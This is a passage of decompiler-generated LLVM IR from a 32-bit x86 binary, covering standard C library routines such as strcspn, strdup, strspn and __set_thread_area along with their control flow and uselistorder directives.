  br i1 %v2_80511ce, label %dec_label_pc_80511b0, label %dec_label_pc_80511d5.loopexit

dec_label_pc_80511d5.loopexit:                    ; preds = %dec_label_pc_80511c2.preheader, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge, %dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge
  %v0_80511d7.pre = phi i32 [ %v0_80511d7.pre.pre, %dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge ], [ %v0_8051197, %dec_label_pc_80511c2.preheader ], [ %storemerge.in.in.pre, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ]
  %v0_805113021 = phi i32 [ %v0_80511bb, %dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge ], [ %v0_805119c, %dec_label_pc_80511c2.preheader ], [ %v0_80511bb, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ]
  %v0_80511d517 = phi i32 [ %v1_80511b8, %dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge ], [ %v0_805119f, %dec_label_pc_80511c2.preheader ], [ %v1_80511b8, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ]
  %v1_80511be7 = phi i1 [ %v9_80511bb, %dec_label_pc_80511b0.dec_label_pc_80511d5.loopexit_crit_edge ], [ false, %dec_label_pc_80511c2.preheader ], [ false, %dec_label_pc_80511b0.dec_label_pc_80511c2_crit_edge ]
  store i1 %v1_80511be7, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80511d5

dec_label_pc_80511d5:                             ; preds = %dec_label_pc_80511d5.loopexit, %dec_label_pc_805119c
  %v0_805113022 = phi i32 [ %v0_805113021, %dec_label_pc_80511d5.loopexit ], [ %v0_805119c, %dec_label_pc_805119c ]
  %v0_80511d7 = phi i32 [ %v0_80511d7.pre, %dec_label_pc_80511d5.loopexit ], [ %v0_8051197, %dec_label_pc_805119c ]
  %v0_80511d5 = phi i32 [ %v0_80511d517, %dec_label_pc_80511d5.loopexit ], [ %v0_805119f, %dec_label_pc_805119c ]
  store i32 %v0_80511d5, i32* %ebx.global-to-local, align 4
  store i32 %v0_80511d7, i32* @edx, align 4
  br label %dec_label_pc_8051130

; uselistorder directives
  uselistorder i32 %v0_80511d5, { 1, 0 }
  uselistorder i32 %v0_80511d7, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge.in.in.pre, { 0, 2, 1 }
  uselistorder i32 %v0_80511bb, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_80511b8, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge42, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805119f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8051197, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v0_805119c, { 4, 2, 3, 0, 1, 5 }
  uselistorder i1 %v3_805118e, { 1, 0 }
  uselistorder i32 %v1_805118b, { 1, 0 }
  uselistorder i32 %v1_8051188, { 0, 2, 1 }
  uselistorder i32 %v1_8051185, { 0, 2, 1 }
  uselistorder i32 %v1_8051152, { 1, 0 }
  uselistorder i32 %v1_805114f, { 1, 0 }
  uselistorder i1 %v12_805112c, { 1, 0 }
  uselistorder i32 %v1_8051129, { 0, 2, 1 }
  uselistorder i32 %v4_8051116, { 1, 2, 0, 3 }
  uselistorder i1* %zf.global-to-local, { 16, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 7, 5, 3, 6, 8 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 10, 4, 1, 5, 6, 8, 3, 7, 9 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80511d5.loopexit, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80511b0, { 1, 0 }
  uselistorder label %dec_label_pc_8051178, { 1, 0 }
  uselistorder label %dec_label_pc_8051157, { 4, 5, 0, 2, 1, 3, 6 }
  uselistorder label %dec_label_pc_805114f, { 1, 0 }
  uselistorder label %dec_label_pc_8051130, { 1, 0 }
}

define i32 @strcspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80511e1 = load i32, i32* @ebx, align 4
  store i32 %v0_80511e1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_80511e9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80511e9, i32* @esi, align 4
  %v2_80511ed = load i8, i8* %tmp14, align 1
  %v4_80511f0 = icmp eq i8 %v2_80511ed, 0
  br i1 %v4_80511f0, label %dec_label_pc_80511fa, label %dec_label_pc_80511f4

dec_label_pc_80511f4:                             ; preds = %entry
  %v1_80511f4 = add i32 %arg2, 1
  %v2_80511f4 = inttoptr i32 %v1_80511f4 to i8*
  %v3_80511f4 = load i8, i8* %v2_80511f4, align 1
  %v4_80511f4 = icmp eq i8 %v3_80511f4, 0
  %v1_80511f8 = icmp eq i1 %v4_80511f4, false
  br i1 %v1_80511f8, label %dec_label_pc_8051211, label %dec_label_pc_80511fa

dec_label_pc_80511fa:                             ; preds = %dec_label_pc_80511f4, %entry
  %v2_80511fa = sext i8 %v2_80511ed to i32
  %v4_8051204 = call i32 @__strchrnul(i8* %arg1, i32 %v2_80511fa)
  %v1_8051209 = load i32, i32* @esi, align 4
  %v2_8051209 = sub i32 %v4_8051204, %v1_8051209
  br label %dec_label_pc_805120b

dec_label_pc_805120b:                             ; preds = %dec_label_pc_80512cb, %dec_label_pc_80511fa
  %storemerge = phi i32 [ %v2_8051209, %dec_label_pc_80511fa ], [ 0, %dec_label_pc_80512cb ]
  %v2_805120e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805120e, i32* @ebx, align 4
  ret i32 %storemerge

dec_label_pc_8051211:                             ; preds = %dec_label_pc_80511f4
  %tmp20 = bitcast i32* %stack_var_-40 to i8*
  %v5_8051228 = call i32 @memset(i8* %tmp20, i32 0, i32 32)
  %v0_805122d = load i32, i32* @ebx, align 4
  %v1_805122d = inttoptr i32 %v0_805122d to i8*
  %v2_805122d = load i8, i8* %v1_805122d, align 1
  %v3_805122d = icmp eq i8 %v2_805122d, 0
  br i1 %v3_805122d, label %dec_label_pc_8051280, label %dec_label_pc_8051232

dec_label_pc_8051232:                             ; preds = %dec_label_pc_8051211
  %v2_8051232 = load i8, i8* %v1_805122d, align 1
  %tmp = urem i8 %v2_8051232, 32
  %v2_805123c = icmp eq i8 %tmp, 0
  %v3_805123f = udiv i8 %v2_8051232, 32
  %v8_805123f = zext i8 %v3_805123f to i32
  br i1 %v2_805123c, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_8051232
  %v1_805123c = zext i8 %tmp to i32
  %v5_8051245 = shl i32 1, %v1_805123c
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_8051232, %bb
  %v0_8051247 = phi i32 [ 1, %dec_label_pc_8051232 ], [ %v5_8051245, %bb ]
  %v1_8051247 = load i32, i32* @esp, align 4
  %v3_8051247 = mul nuw nsw i32 %v8_805123f, 4
  %v4_8051247 = add nuw nsw i32 %v3_8051247, 20
  %v5_8051247 = add i32 %v4_8051247, %v1_8051247
  %v6_8051247 = inttoptr i32 %v5_8051247 to i32*
  %v7_8051247 = load i32, i32* %v6_8051247, align 4
  %v8_8051247 = or i32 %v7_8051247, %v0_8051247
  %v9_8051247 = icmp eq i32 %v8_8051247, 0
  store i32 %v8_8051247, i32* %v6_8051247, align 4
  %v1_8051251 = icmp eq i1 %v9_8051247, false
  br i1 %v1_8051251, label %dec_label_pc_805127a, label %dec_label_pc_8051280

dec_label_pc_8051255:                             ; preds = %dec_label_pc_805127a
  %v3_8051255 = load i8, i8* %v2_805127a, align 1
  store i32 %v1_805127a, i32* @ebx, align 4
  %tmp29 = urem i8 %v3_8051255, 32
  %v2_8051263 = icmp eq i8 %tmp29, 0
  %v3_8051266 = udiv i8 %v3_8051255, 32
  %v8_8051266 = zext i8 %v3_8051266 to i32
  br i1 %v2_8051263, label %bb23, label %bb22

bb22:                                             ; preds = %dec_label_pc_8051255
  %v1_8051263 = zext i8 %tmp29 to i32
  %v5_805126c = shl i32 1, %v1_8051263
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_8051255, %bb22
  %v0_805126e = phi i32 [ 1, %dec_label_pc_8051255 ], [ %v5_805126c, %bb22 ]
  %v1_805126e = load i32, i32* @esp, align 4
  %v3_805126e = mul nuw nsw i32 %v8_8051266, 4
  %v4_805126e = add nuw nsw i32 %v3_805126e, 20
  %v5_805126e = add i32 %v4_805126e, %v1_805126e
  %v6_805126e = inttoptr i32 %v5_805126e to i32*
  %v7_805126e = load i32, i32* %v6_805126e, align 4
  %v8_805126e = or i32 %v7_805126e, %v0_805126e
  %v9_805126e = icmp eq i32 %v8_805126e, 0
  store i32 %v8_805126e, i32* %v6_805126e, align 4
  br i1 %v9_805126e, label %dec_label_pc_8051280, label %dec_label_pc_805127a

dec_label_pc_805127a:                             ; preds = %bb21, %bb23
  %v0_805127a = load i32, i32* @ebx, align 4
  %v1_805127a = add i32 %v0_805127a, 1
  %v2_805127a = inttoptr i32 %v1_805127a to i8*
  %v3_805127a = load i8, i8* %v2_805127a, align 1
  %v4_805127a = icmp eq i8 %v3_805127a, 0
  %v1_805127e = icmp eq i1 %v4_805127a, false
  br i1 %v1_805127e, label %dec_label_pc_8051255, label %dec_label_pc_8051280

dec_label_pc_8051280:                             ; preds = %bb23, %dec_label_pc_805127a, %bb21, %dec_label_pc_8051211
  %v0_8051280 = load i32, i32* @esi, align 4
  %v1_8051280 = inttoptr i32 %v0_8051280 to i8*
  %v2_8051280 = load i8, i8* %v1_8051280, align 1
  %v3_8051280 = icmp eq i8 %v2_8051280, 0
  br i1 %v3_8051280, label %dec_label_pc_80512cb, label %dec_label_pc_8051285

dec_label_pc_8051285:                             ; preds = %dec_label_pc_8051280
  %v2_8051285 = load i8, i8* %v1_8051280, align 1
  %tmp30 = urem i8 %v2_8051285, 32
  %v2_805128a = icmp eq i8 %tmp30, 0
  %v3_805128d = udiv i8 %v2_8051285, 32
  %v8_805128d = zext i8 %v3_805128d to i32
  %v0_8051293 = load i32, i32* @esp, align 4
  %v2_8051293 = mul nuw nsw i32 %v8_805128d, 4
  %v3_8051293 = add nuw nsw i32 %v2_8051293, 20
  %v4_8051293 = add i32 %v3_8051293, %v0_8051293
  %v5_8051293 = inttoptr i32 %v4_8051293 to i32*
  %v6_8051293 = load i32, i32* %v5_8051293, align 4
  br i1 %v2_805128a, label %bb25, label %bb24

bb24:                                             ; preds = %dec_label_pc_8051285
  %v1_805128a = zext i8 %tmp30 to i32
  %v5_8051297 = lshr i32 %v6_8051293, %v1_805128a
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_8051285, %bb24
  %v0_8051299 = phi i32 [ %v6_8051293, %dec_label_pc_8051285 ], [ %v5_8051297, %bb24 ]
  %v2_8051299 = urem i32 %v0_8051299, 2
  %v3_8051299 = icmp eq i32 %v2_8051299, 0
  %v1_805129b = icmp eq i1 %v3_8051299, false
  br i1 %v1_805129b, label %dec_label_pc_80512cb, label %dec_label_pc_805129d

dec_label_pc_805129d:                             ; preds = %bb25
  %v3_80512af = add i32 %v0_8051293, 20
  br label %dec_label_pc_80512b9

dec_label_pc_80512a1:                             ; preds = %dec_label_pc_80512b9
  %v2_80512a1 = load i8, i8* %v1_80512bc, align 1
  %tmp31 = urem i8 %v2_80512a1, 32
  %v2_80512a6 = icmp eq i8 %tmp31, 0
  %v3_80512a9 = udiv i8 %v2_80512a1, 32
  %v8_80512a9 = zext i8 %v3_80512a9 to i32
  %v2_80512af = mul nuw nsw i32 %v8_80512a9, 4
  %v4_80512af = add i32 %v3_80512af, %v2_80512af
  %v5_80512af = inttoptr i32 %v4_80512af to i32*
  %v6_80512af = load i32, i32* %v5_80512af, align 4
  br i1 %v2_80512a6, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_80512a1
  %v1_80512a6 = zext i8 %tmp31 to i32
  %v5_80512b3 = lshr i32 %v6_80512af, %v1_80512a6
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_80512a1, %bb26
  %v0_80512b5 = phi i32 [ %v6_80512af, %dec_label_pc_80512a1 ], [ %v5_80512b3, %bb26 ]
  %v2_80512b5 = urem i32 %v0_80512b5, 2
  %v3_80512b5 = icmp eq i32 %v2_80512b5, 0
  %v1_80512b7 = icmp eq i1 %v3_80512b5, false
  br i1 %v1_80512b7, label %dec_label_pc_80512c1, label %dec_label_pc_80512b9

dec_label_pc_80512b9:                             ; preds = %bb27, %dec_label_pc_805129d
  %v0_80512b9 = phi i32 [ %v1_80512b9, %bb27 ], [ %v0_8051280, %dec_label_pc_805129d ]
  %v1_80512b9 = add i32 %v0_80512b9, 1
  %v1_80512bc = inttoptr i32 %v1_80512b9 to i8*
  %v2_80512bc = load i8, i8* %v1_80512bc, align 1
  %v3_80512bc = icmp eq i8 %v2_80512bc, 0
  %v1_80512bf = icmp eq i1 %v3_80512bc, false
  br i1 %v1_80512bf, label %dec_label_pc_80512a1, label %dec_label_pc_80512c1

dec_label_pc_80512c1:                             ; preds = %bb27, %dec_label_pc_80512b9
  %v2_80512c6 = sub i32 %v1_80512b9, %v0_8051280
  %v2_80512c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80512c8, i32* @ebx, align 4
  ret i32 %v2_80512c6

dec_label_pc_80512cb:                             ; preds = %bb25, %dec_label_pc_8051280
  br label %dec_label_pc_805120b

; uselistorder directives
  uselistorder i8* %v1_80512bc, { 1, 0 }
  uselistorder i32 %v1_80512b9, { 0, 2, 1 }
  uselistorder i8 %tmp31, { 1, 0 }
  uselistorder i8 %v2_80512a1, { 1, 0 }
  uselistorder i8 %tmp30, { 1, 0 }
  uselistorder i8 %v2_8051285, { 1, 0 }
  uselistorder i8* %v2_805127a, { 1, 0 }
  uselistorder i32 %v1_805127a, { 1, 0 }
  uselistorder i8 %tmp29, { 1, 0 }
  uselistorder i8 %v3_8051255, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i8 %v2_8051232, { 1, 0 }
  uselistorder label %dec_label_pc_80512c1, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_8051280, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805127a, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__strdup(i8* %arg1) local_unnamed_addr {
entry:
  %v0_80512e3 = load i32, i32* @esi, align 4
  %v4_80512e7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80512e7, i32* @esi, align 4
  %v3_80512f2 = call i32 @strlen(i8* %arg1)
  %v1_80512f7 = add i32 %v3_80512f2, 1
  store i32 %v1_80512f7, i32* @ebx, align 4
  %v2_80512fd = call i32 @malloc(i32 %v1_80512f7)
  %v1_8051304 = icmp eq i32 %v2_80512fd, 0
  br i1 %v1_8051304, label %dec_label_pc_805131a, label %dec_label_pc_8051308

dec_label_pc_8051308:                             ; preds = %entry
  %v0_8051308 = load i32, i32* @ebx, align 4
  %v0_805130c = load i32, i32* @esi, align 4
  %v4_8051310 = inttoptr i32 %v2_80512fd to i8*
  %v6_8051313 = call i32 @memcpy(i8* %v4_8051310, i32 %v0_805130c, i32 %v0_8051308)
  br label %dec_label_pc_805131a

dec_label_pc_805131a:                             ; preds = %entry, %dec_label_pc_8051308
  %v0_805131e = phi i32 [ 0, %entry ], [ %v6_8051313, %dec_label_pc_8051308 ]
  store i32 %v0_80512e3, i32* @esi, align 4
  ret i32 %v0_805131e

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 7, 3, 0, 10, 9, 11, 8, 6, 5, 4, 2, 1 }
  uselistorder i32 (i8*)* @strlen, { 29, 1, 0, 28, 7, 6, 5, 4, 3, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 8, 9, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805131a, { 1, 0 }
}

define i32 @strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp16 = inttoptr i32 %arg2 to i8*
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051334 = load i32, i32* @ebx, align 4
  store i32 %v0_8051334, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v4_805133c = ptrtoint i8* %arg1 to i32
  store i32 %v4_805133c, i32* %esi.global-to-local, align 4
  %v2_8051340 = load i8, i8* %tmp16, align 1
  %v3_8051340 = zext i8 %v2_8051340 to i32
  store i32 %v3_8051340, i32* @edx, align 4
  %v4_8051343 = icmp eq i8 %v2_8051340, 0
  br i1 %v4_8051343, label %dec_label_pc_80513d3, label %dec_label_pc_805134b

dec_label_pc_805134b:                             ; preds = %entry
  %v1_805134b = add i32 %arg2, 1
  %v2_805134b = inttoptr i32 %v1_805134b to i8*
  %v3_805134b = load i8, i8* %v2_805134b, align 1
  %v4_805134b = icmp eq i8 %v3_805134b, 0
  br i1 %v4_805134b, label %dec_label_pc_80513da, label %dec_label_pc_8051355

dec_label_pc_8051355:                             ; preds = %dec_label_pc_805134b
  store i1 false, i1* @df, align 1
  %tmp22 = bitcast i32* %stack_var_-44 to i8*
  %v5_805135d = call i8* @_memset(i8* %tmp22, i32 0, i32 8)
  %v0_8051364.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051364

dec_label_pc_8051361:                             ; preds = %dec_label_pc_8051382
  %v2_8051361 = load i8, i8* %v1_8051385, align 1
  %v3_8051361 = zext i8 %v2_8051361 to i32
  br label %dec_label_pc_8051364

dec_label_pc_8051364:                             ; preds = %dec_label_pc_8051355, %dec_label_pc_8051361
  %v0_8051364 = phi i32 [ %v0_8051364.pre, %dec_label_pc_8051355 ], [ %v3_8051361, %dec_label_pc_8051361 ]
  %v3_8051368 = udiv i32 %v0_8051364, 32
  %v8_8051368 = urem i32 %v3_8051368, 8
  %v1_805136b = urem i32 %v0_8051364, 32
  %v2_805136b = icmp eq i32 %v1_805136b, 0
  br i1 %v2_805136b, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_8051364
  %v5_8051376 = shl i32 1, %v1_805136b
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_8051364, %bb
  %v0_8051378 = phi i32 [ 1, %dec_label_pc_8051364 ], [ %v5_8051376, %bb ]
  %v1_8051378 = load i32, i32* @esp, align 4
  %v3_8051378 = mul nuw nsw i32 %v8_8051368, 4
  %v4_8051378 = add i32 %v1_8051378, %v3_8051378
  %v5_8051378 = inttoptr i32 %v4_8051378 to i32*
  %v6_8051378 = load i32, i32* %v5_8051378, align 4
  %v7_8051378 = or i32 %v6_8051378, %v0_8051378
  %v8_8051378 = icmp eq i32 %v7_8051378, 0
  store i32 %v7_8051378, i32* @edx, align 4
  store i32 %v7_8051378, i32* %v5_8051378, align 4
  br i1 %v8_8051378, label %dec_label_pc_805138a, label %dec_label_pc_8051382

dec_label_pc_8051382:                             ; preds = %bb23
  %v0_8051382 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051382 = add i32 %v0_8051382, 1
  store i32 %v1_8051382, i32* %ebx.global-to-local, align 4
  %v1_8051385 = inttoptr i32 %v1_8051382 to i8*
  %v2_8051385 = load i8, i8* %v1_8051385, align 1
  %v3_8051385 = icmp eq i8 %v2_8051385, 0
  %v1_8051388 = icmp eq i1 %v3_8051385, false
  br i1 %v1_8051388, label %dec_label_pc_8051361, label %dec_label_pc_805138a

dec_label_pc_805138a:                             ; preds = %dec_label_pc_8051382, %bb23
  %v0_805138a = load i32, i32* %esi.global-to-local, align 4
  %v1_805138a = inttoptr i32 %v0_805138a to i8*
  %v2_805138a = load i8, i8* %v1_805138a, align 1
  %v3_805138a = icmp eq i8 %v2_805138a, 0
  br i1 %v3_805138a, label %dec_label_pc_805138a.dec_label_pc_80513ed_crit_edge, label %dec_label_pc_805138f

dec_label_pc_805138a.dec_label_pc_80513ed_crit_edge: ; preds = %dec_label_pc_805138a
  br label %dec_label_pc_80513ed

dec_label_pc_805138f:                             ; preds = %dec_label_pc_805138a
  %v2_805138f = load i8, i8* %v1_805138a, align 1
  %tmp = urem i8 %v2_805138f, 32
  %v2_8051394 = icmp eq i8 %tmp, 0
  %v3_8051397 = udiv i8 %v2_805138f, 32
  %v8_8051397 = zext i8 %v3_8051397 to i32
  %v0_805139d = load i32, i32* @esp, align 4
  %v2_805139d = mul nuw nsw i32 %v8_8051397, 4
  %v3_805139d = add i32 %v0_805139d, %v2_805139d
  %v4_805139d = inttoptr i32 %v3_805139d to i32*
  %v5_805139d = load i32, i32* %v4_805139d, align 4
  br i1 %v2_8051394, label %bb25, label %bb24

bb24:                                             ; preds = %dec_label_pc_805138f
  %v1_8051394 = zext i8 %tmp to i32
  %v5_80513a0 = lshr i32 %v5_805139d, %v1_8051394
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_805138f, %bb24
  %v0_80513a2 = phi i32 [ %v5_805139d, %dec_label_pc_805138f ], [ %v5_80513a0, %bb24 ]
  %v2_80513a2 = urem i32 %v0_80513a2, 2
  %v3_80513a2 = icmp eq i32 %v2_80513a2, 0
  br i1 %v3_80513a2, label %dec_label_pc_80513ed, label %dec_label_pc_80513a6

dec_label_pc_80513a6:                             ; preds = %bb25
  br label %dec_label_pc_80513c7

dec_label_pc_80513b0:                             ; preds = %dec_label_pc_80513c7
  %v2_80513b0 = load i8, i8* %v1_80513ca, align 1
  %tmp28 = urem i8 %v2_80513b0, 32
  %v2_80513b5 = icmp eq i8 %tmp28, 0
  %v3_80513b8 = udiv i8 %v2_80513b0, 32
  %v8_80513b8 = zext i8 %v3_80513b8 to i32
  %v2_80513be = mul nuw nsw i32 %v8_80513b8, 4
  %v3_80513be = add i32 %v2_80513be, %v0_805139d
  %v4_80513be = inttoptr i32 %v3_80513be to i32*
  %v5_80513be = load i32, i32* %v4_80513be, align 4
  br i1 %v2_80513b5, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_80513b0
  %v1_80513b5 = zext i8 %tmp28 to i32
  %v5_80513c1 = lshr i32 %v5_80513be, %v1_80513b5
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_80513b0, %bb26
  %v0_80513c3 = phi i32 [ %v5_80513be, %dec_label_pc_80513b0 ], [ %v5_80513c1, %bb26 ]
  %v2_80513c3 = urem i32 %v0_80513c3, 2
  %v3_80513c3 = icmp eq i32 %v2_80513c3, 0
  br i1 %v3_80513c3, label %dec_label_pc_80513cf, label %dec_label_pc_80513c7

dec_label_pc_80513c7:                             ; preds = %bb27, %dec_label_pc_80513a6
  %v0_80513c7 = phi i32 [ %v1_80513c7, %bb27 ], [ %v0_805138a, %dec_label_pc_80513a6 ]
  %v1_80513c7 = add i32 %v0_80513c7, 1
  store i32 %v1_80513c7, i32* @edx, align 4
  %v1_80513ca = inttoptr i32 %v1_80513c7 to i8*
  %v2_80513ca = load i8, i8* %v1_80513ca, align 1
  %v3_80513ca = icmp eq i8 %v2_80513ca, 0
  %v1_80513cd = icmp eq i1 %v3_80513ca, false
  br i1 %v1_80513cd, label %dec_label_pc_80513b0, label %dec_label_pc_80513cf

dec_label_pc_80513cf:                             ; preds = %bb27, %dec_label_pc_80513c7
  %v2_80513d1 = sub i32 %v1_80513c7, %v0_805138a
  br label %dec_label_pc_80513d3

dec_label_pc_80513d3:                             ; preds = %dec_label_pc_80513da, %entry, %dec_label_pc_80513ed, %dec_label_pc_80513e9, %dec_label_pc_80513cf
  %v0_80513d9 = phi i32 [ 0, %dec_label_pc_80513da ], [ 0, %entry ], [ 0, %dec_label_pc_80513ed ], [ %v2_80513e9, %dec_label_pc_80513e9 ], [ %v2_80513d1, %dec_label_pc_80513cf ]
  %v2_80513d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80513d6, i32* @ebx, align 4
  ret i32 %v0_80513d9

dec_label_pc_80513da:                             ; preds = %dec_label_pc_805134b
  %v4_80513dc = load i8, i8* %arg1, align 1
  %v15_80513dc = icmp eq i8 %v2_8051340, %v4_80513dc
  %v1_80513de = icmp eq i1 %v15_80513dc, false
  br i1 %v1_80513de, label %dec_label_pc_80513d3, label %dec_label_pc_80513e0

dec_label_pc_80513e0:                             ; preds = %dec_label_pc_80513da
  br label %dec_label_pc_80513e2

dec_label_pc_80513e2:                             ; preds = %dec_label_pc_80513e2, %dec_label_pc_80513e0
  %v0_80513e2 = phi i32 [ %v1_80513e2, %dec_label_pc_80513e2 ], [ %v4_805133c, %dec_label_pc_80513e0 ]
  %v1_80513e2 = add i32 %v0_80513e2, 1
  %v3_80513e5 = inttoptr i32 %v1_80513e2 to i8*
  %v4_80513e5 = load i8, i8* %v3_80513e5, align 1
  %v15_80513e5 = icmp eq i8 %v2_8051340, %v4_80513e5
  br i1 %v15_80513e5, label %dec_label_pc_80513e2, label %dec_label_pc_80513e9

dec_label_pc_80513e9:                             ; preds = %dec_label_pc_80513e2
  %v2_80513e9 = sub i32 %v1_80513e2, %v4_805133c
  br label %dec_label_pc_80513d3

dec_label_pc_80513ed:                             ; preds = %dec_label_pc_805138a.dec_label_pc_80513ed_crit_edge, %bb25
  br label %dec_label_pc_80513d3

; uselistorder directives
  uselistorder i32 %v1_80513e2, { 0, 2, 1 }
  uselistorder i8* %v1_80513ca, { 1, 0 }
  uselistorder i32 %v1_80513c7, { 0, 2, 3, 1 }
  uselistorder i8 %tmp28, { 1, 0 }
  uselistorder i8 %v2_80513b0, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i8 %v2_805138f, { 1, 0 }
  uselistorder i8* %v1_8051385, { 1, 0 }
  uselistorder i32 %v1_805136b, { 1, 0 }
  uselistorder i32 %v0_8051364, { 1, 0 }
  uselistorder label %dec_label_pc_80513ed, { 1, 0 }
  uselistorder label %dec_label_pc_80513d3, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_80513cf, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_8051364, { 1, 0 }
}

define i32 @__set_thread_area(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80513f4 = load i32, i32* @ebx, align 4
  %v4_8051400 = inttoptr i32 %arg1 to i32*
  %v5_8051400 = call i32 @function_8051405(i32* %v4_8051400, i32 1048575, i32 81, i32 %v0_80513f4)
  ret i32 %v5_8051400
}

define i32 @function_8051405(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051405:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %v3_8051405 = add i32 %tmp6, 20787
  store i32 %v3_8051405, i32* %stack_var_0, align 4
  store i32 %v3_8051405, i32* %ecx.global-to-local, align 4
  %v1_805140d = inttoptr i32 %v3_8051405 to i32*
  %v2_805140d = load i32, i32* %v1_805140d, align 4
  store i32 %v2_805140d, i32* %edx.global-to-local, align 4
  store i32 %v2_805140d, i32* %stack_var_0, align 4
  store i32 243, i32* %eax.global-to-local, align 4
  %v1_8051416 = call i32 @int80_syscall(i32 243)
  store i32 %v1_8051416, i32* %eax.global-to-local, align 4
  %v1_8051418 = icmp eq i32 %v1_8051416, 0
  %v1_805141a = icmp eq i1 %v1_8051418, false
  br i1 %v1_805141a, label %dec_label_pc_805142f, label %dec_label_pc_805141c

dec_label_pc_805141c:                             ; preds = %dec_label_pc_8051405
  %v2_805141c = load i32, i32* %stack_var_0, align 4
  store i32 %v2_805141c, i32* %edx.global-to-local, align 4
  %v1_805141f = load i32, i32* %ecx.global-to-local, align 4
  %v2_805141f = inttoptr i32 %v1_805141f to i32*
  store i32 %v2_805141c, i32* %v2_805141f, align 4
  %v0_8051421 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051421 = mul i32 %v0_8051421, 8
  %v2_8051421 = or i32 %v1_8051421, 3
  store i32 %v2_8051421, i32* %edx.global-to-local, align 4
  %v0_805142e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051428

dec_label_pc_8051428:                             ; preds = %dec_label_pc_8051444, %dec_label_pc_805141c
  %v0_805142e.pre = phi i32 [ %v17_8051446, %dec_label_pc_8051444 ], [ %v0_805142e.pre.pre, %dec_label_pc_805141c ]
  br label %dec_label_pc_805142a

dec_label_pc_805142a:                             ; preds = %dec_label_pc_805142f, %dec_label_pc_8051428
  %v0_805142e = phi i32 [ %v1_805143e, %dec_label_pc_805142f ], [ %v0_805142e.pre, %dec_label_pc_8051428 ]
  store i32 %arg2, i32* @ebx, align 4
  ret i32 %v0_805142e

dec_label_pc_805142f:                             ; preds = %dec_label_pc_8051405
  %v4_805140f = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_805140f, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  %v1_805143c = and i32 %v1_8051416, -256
  %v2_805143c = or i32 %v1_805143c, 123
